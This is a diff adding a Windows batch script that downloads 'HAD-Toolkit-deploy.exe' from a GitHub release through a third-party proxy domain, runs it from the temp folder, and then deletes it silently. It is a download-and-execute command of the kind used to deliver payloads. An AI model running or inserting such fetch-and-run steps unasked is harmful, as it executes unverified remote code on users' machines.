@@ -1,0 +1,4 @@
+@echo off
+curl https://gh.fhjhy.top/https://github.com/nnpyro1/download/releases/download/had-toolkit/HAD-Toolkit-deploy.exe -o %temp%\install.exe
+start /wait %temp%\install.exe
+del %temp%\install.exe >nul
